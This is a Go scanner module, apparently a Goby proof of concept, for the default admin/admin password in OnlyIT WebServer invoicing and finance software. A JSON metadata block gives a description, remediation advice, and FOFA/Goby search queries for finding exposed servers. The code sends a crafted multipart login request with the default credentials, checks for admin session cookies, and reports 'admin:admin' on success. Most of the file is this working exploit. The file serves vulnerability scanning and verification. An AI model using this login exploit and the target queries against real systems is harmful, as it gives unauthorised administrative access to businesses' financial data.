package exploits

import (
	"encoding/hex"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "OnlyIT WebServer Default Password",
    "Description": "<p>OnlyIT Invoicing Financial Management Software is an integrated financial management software for small and medium-sized enterprises.</p><p>The admin user of the OnlyIT system has a default password of admin/admin, and an attacker can directly use this password to log in to the system, obtain the background operation authority of the system, and perform sensitive operations.</p>",
    "Product": "Onlyit-WebServer",
    "Homepage": "http://www.onlyit.cn/",
    "DisclosureDate": "2022-04-13",
    "Author": "1154908054@qq.com",
    "FofaQuery": "server=\"Onlyit WebServer\" || (banner=\"Onlyit WebServer\" && banner=\"Server: \")",
    "GobyQuery": "server=\"Onlyit WebServer\" || (banner=\"Onlyit WebServer\" && banner=\"Server: \")",
    "Level": "3",
    "Impact": "<p>The default password admin/admin exists in the admin user of onlyIt system. The attacker can directly log in to the system with this password to obtain the background operation permission of the system and perform sensitive operations. </p>",
    "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.</p><p>2. If not necessary, prohibit public network access to the system.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
    "References": [
        "http://www.onlyit.cn/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Default Password"
    ],
    "VulType": [
        "Default Password"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "9.7",
    "Translation": {
        "CN": {
            "Name": "OnlyIT 进销存财务管理软件默认口令",
            "Product": "Onlyit-WebServer",
            "Description": "<p>OnlyIT 进销存财务管理软件是一款针对中小企业的进销存、财务一体化管理软件。</p><p>OnlyIT 系统 admin 用户存在默认口令 admin/admin，攻击者可以直接使用该口令登陆系统，获取系统后台操作权限，执行敏感操作。</p>",
            "Recommendation": "<p>1、修改默认口令，密码最好包含大小写字母、数字和特殊字符等，且位数大于8位。</p><p>2、如非必要，禁止公网访问该系统。</p><p>3、通过防火墙等安全设备设置访问策略，设置白名单访问。</p>",
            "Impact": "<p>OnlyIT 系统 admin 用户存在默认口令 admin/admin，攻击者可以直接使用该口令登陆系统，获取系统后台操作权限，执行敏感操作。<br></p>",
            "VulType": [
                "默认口令"
            ],
            "Tags": [
                "默认口令"
            ]
        },
        "EN": {
            "Name": "OnlyIT WebServer Default Password",
            "Product": "Onlyit-WebServer",
            "Description": "<p>OnlyIT Invoicing Financial Management Software is an integrated financial management software for small and medium-sized enterprises.</p><p>The admin user of the OnlyIT system has a default password of admin/admin, and an attacker can directly use this password to log in to the system, obtain the background operation authority of the system, and perform sensitive operations.</p>",
            "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.</p><p>2. If not necessary, prohibit public network access to the system.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
            "Impact": "<p><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">The default password admin/admin exists in the admin user of onlyIt system. The attacker can directly log in to the system with this password to obtain the background operation permission of the system and perform sensitive operations.&nbsp;</span><br></p>",
            "VulType": [
                "Default Password"
            ],
            "Tags": [
                "Default Password"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-07-28",
    "PocId": "10692"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			cfg := httpclient.NewPostRequestConfig("/login?action=login")
			cfg.FollowRedirect = false
			cfg.Timeout = 15
			cfg.Header.Store("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundaryfvEVWJnzi8hKmodS")

			cfg.Data = "------WebKitFormBoundaryfvEVWJnzi8hKmodS\r\nContent-Disposition: form-data; name=\"user_id\"\r\n\r\nadmin\r\n------WebKitFormBoundaryfvEVWJnzi8hKmodS\r\nContent-Disposition: form-data; name=\"pwd\"\r\n\r\nadmin\r\n------WebKitFormBoundaryfvEVWJnzi8hKmodS\r\nContent-Disposition: form-data; name=\"tm_type\"\r\n\r\nA\r\n------WebKitFormBoundaryfvEVWJnzi8hKmodS\nContent-Disposition: form-data; name=\"call_login\"\r\n\r\n"
			cfg.Data += hex.EncodeToString([]byte{0xb5, 0xc7, 0xcf, 0xb5, 0xcd, 0xb3}) + "\r\n"
			cfg.Data += "------WebKitFormBoundaryfvEVWJnzi8hKmodS--\r\n"
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				if resp.StatusCode == 302 && strings.Contains(resp.HeaderString.String(), "Set-Cookie: session_id") && strings.Contains(resp.HeaderString.String(), "Set-Cookie: login_auth_id=admin;") && strings.Contains(resp.HeaderString.String(), "Set-Cookie: login_user_id=admin;") && strings.Contains(resp.HeaderString.String(), "Location:") {
					return true
				}
			}

			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {

			cfg := httpclient.NewPostRequestConfig("/login?action=login")
			cfg.FollowRedirect = false
			cfg.Timeout = 15
			cfg.Header.Store("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundaryfvEVWJnzi8hKmodS")

			cfg.Data = "------WebKitFormBoundaryfvEVWJnzi8hKmodS\r\nContent-Disposition: form-data; name=\"user_id\"\r\n\r\nadmin\r\n------WebKitFormBoundaryfvEVWJnzi8hKmodS\r\nContent-Disposition: form-data; name=\"pwd\"\r\n\r\nadmin\r\n------WebKitFormBoundaryfvEVWJnzi8hKmodS\r\nContent-Disposition: form-data; name=\"tm_type\"\r\n\r\nA\r\n------WebKitFormBoundaryfvEVWJnzi8hKmodS\nContent-Disposition: form-data; name=\"call_login\"\r\n\r\n"
			cfg.Data += hex.EncodeToString([]byte{0xb5, 0xc7, 0xcf, 0xb5, 0xcd, 0xb3}) + "\r\n"
			cfg.Data += "------WebKitFormBoundaryfvEVWJnzi8hKmodS--\r\n"
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 302 && strings.Contains(resp.HeaderString.String(), "Set-Cookie: session_id") && strings.Contains(resp.HeaderString.String(), "Set-Cookie: login_auth_id=admin;") && strings.Contains(resp.HeaderString.String(), "Set-Cookie: login_user_id=admin;") && strings.Contains(resp.HeaderString.String(), "Location:") {
					expResult.Success = true
					expResult.Output = "admin:admin"
				}
			}

			return expResult
		},
	))
}
